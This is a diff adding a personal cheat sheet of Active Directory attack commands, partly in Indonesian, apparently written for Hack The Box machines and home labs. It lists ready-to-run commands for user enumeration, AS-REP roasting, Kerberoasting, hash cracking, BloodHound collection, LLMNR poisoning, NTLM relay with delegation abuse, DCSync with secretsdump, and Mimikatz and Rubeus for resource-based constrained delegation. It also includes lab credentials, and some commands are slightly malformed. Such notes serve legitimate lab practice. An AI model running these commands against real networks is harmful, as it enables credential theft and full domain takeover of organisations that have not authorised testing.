@@ -1,0 +1,105 @@
+fake time issue timeskew
+add this on ~/.zshrc
+ft() {
+  faketime "$(ntpdate -q 10.10.11.75 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" "$@"
+}
+
+source ~/.zshrc
+test: ft impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
+
+• enumerate userlist:
+1. rpcclient 
+anonymous -> rpcclient -U “” -N ipaddress
+
+2.kerbrute
+
+3.ldapsearch
+ldapsearch -x -H ldap://10.10.11.70 -D "PUPPY.HTB" -W -b "DC=puppy,DC=htb" (sAMAccountName"
+
+4.enum4linux -a ipaddress
+5. nxc
+nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k --users
+
+• querying/enumerate: 
+ nxc smb 192.168.88.142 -u userfile -p 'P@ssw0rd' --shares
+ smbclient -L \\\\192.168.88.116\\share --user=gotham.local/Alfred%'P@ssw0rd'
+ mount //192.168.88.116/share  ./smb -o username=alfred,password=P@ssw0rd
+ 
+ ldapsearch -LLL -x -H ldap://gotham.local -b ‘’ -s base ‘(objectclass=*)’
+ 
+•  crack:
+ john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt hugo.hash
+ 
+ a. ASPREP ( cukup punya list userfile, bisa dapat hash dari user lain) > GetUserNPU
+ impacket-GetNPUsers gotham.local/ -usersfile user2 -request -format hashcat -dc-ip 192.168.88.142
+ 
+ b. kerberoasting (harus punya username dan password, bisa dapat hash user lain) > GetUserSPN
+ impacket-GetUserSPNs gotham.local/hugo -request -dc-ip 192.168.88.142
+
+• login as user:
+impacket-psexec username@192.168.1.233
+evil-winrm -i 192.168.88.116 -u hugo -p Str4ngeMind!
+
+• bloodhound:
+collection json -> bloodhound.py
+python3 bloodhound.py -u 'ADAM.SILVER' -p 'Abc123456!' -d cybercorp.com -c all -v -ns 10.0.2.8
+nxc ldap 192.168.56.11  -u hodor -p 'hodor' --dns-server 192.168.56.11 --bloodhound -c All
+bloodhound-python
+bloodhound-python  -u 'rr.parker' -p '8#t5HE8L!W3A' -k -d rustykey.htb -ns 10.10.11.75 -c ALl --zip
+
+running neo4j (database bloodhound) -> neo4j console , user neo4j pass root
+running bloodhound -> bloodhound
+
+LLMNR Poision -> Responder
+
+• ntlmrelay attack -> 
+impacket-ntlmrelayx -debug -t ldap://ipaddrldap -i -smb2support -domain namadomain
+impacket-ntlmrelayx -debug -t ldap://ipaddrldap --delegate-access --no-smb-server
+By using the --delegate-access option, I would be able to create computer accounts with special delegation rights
+ --delegate-access: Attempt to configure delegation rights on created computer accounts
+--no-smb-server: Don't start an SMB server, as we're using Responder for credential capture
+
+
+• DCSync attack - Extracting NTLM Hashes with Secretsdump
+impacket-secretsdump -dc-ip 192.168.0.206 -just-dc CORP.LOCAL/ATTACKER-PC02\$:"s0m3p455w0rd"@192.168.0.206
+-dc-ip 192.168.0.206: Specifies the IP address of the domain controller
+-just-dc: Only extract domain credentials (not local SAM hashes)
+CORP.LOCAL/ATTACKER-PC02\$:"s0m3p455w0rd": Authentication using our machine account
+ @192.168.0.206: Target domain controller
+ 
+•  RBCD (resource based constrained delegation)
+Mikikatz ->https://github.com/gentilkiwi/mimikatz/security
+sekurlsa::logonpassword -> to get rc4 hash
+
+Rubeus -> github ghostpack https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+rubeus.exe s4u /user:username$ /rc4:xxx /impersonateuser:administrator /msdsspn:arkham.gotham.local /domain:gotham.local /ptt /nowrap
+
+• setup krb5.conf
+/etc/krb5.conf 
+[libdefaults]
+    default_realm = RUSTYKEY.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    ticket_lifetime = 24h
+    forwardable = true
+
+[realms]
+    RUSTYKEY.HTB = {
+        kdc = 10.10.11.75
+    }
+
+[domain_realm]
+    .rustykey.htb = RUSTYKEY.HTB
+    rustykey.htb = RUSTYKEY.HTB
+
+export ticket yg digenerate:
+export KRB5CCNAME=/home/kali/RustyKey/rr.parker.ccache
+verifikasi: klist
+
+
+
+
+ 
+
+
+
